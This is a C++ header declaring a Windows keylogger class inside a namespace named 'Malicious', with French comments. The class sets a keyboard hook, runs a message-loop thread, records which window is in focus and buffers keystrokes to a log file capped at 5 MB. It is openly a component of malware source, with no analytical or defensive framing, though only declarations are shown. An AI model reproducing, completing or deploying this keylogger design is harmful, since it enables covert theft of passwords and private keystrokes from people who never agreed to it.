#pragma once

#include <map>
#include <string>
#include <fstream>
#include <windows.h>
#include <common/Singleton.hpp>

namespace Malicious
{
    typedef __declspec(dllexport) LRESULT (CALLBACK *HookProc) ( int nCode,  WPARAM wParam,  LPARAM lParam);

    // Intercepteur de touches
	class Keylogger : public Common::Singleton<Keylogger>
    {
        friend class Common::Singleton<Keylogger>;

        protected:
            // l'intercepteur doit connaitre le gestionnaire
            // qui va enregistrer les touches
            Keylogger();
            ~Keylogger();

        public:

            const std::string& get_keylog_path(){return log_file;}
            void setKeylog(const std::string& file);
            void flush();
            void start();
            void stop();
            void clearKeylog();
            bool activated();
            void addKey(const char key);
            HHOOK getHook(){return hook;}

			// limite de la taille du fichier log a 5 Mo
			enum {MAX_BUFFERED = 2048, LOGFILE_MAX_SIZE = 5000000};
			
        private:

            HHOOK hook;
            DWORD dwThread;
            HANDLE hThread;
            std::string log_file;
            std::fstream log;
            bool isActivated;
            unsigned int buffered_char;
			std::string window;
            std::map<std::string, std::string> log_buffer;

            void updateWindowTitle();
            static DWORD WINAPI MsgLoop(LPVOID lpParameter);
    };

} // Malicious
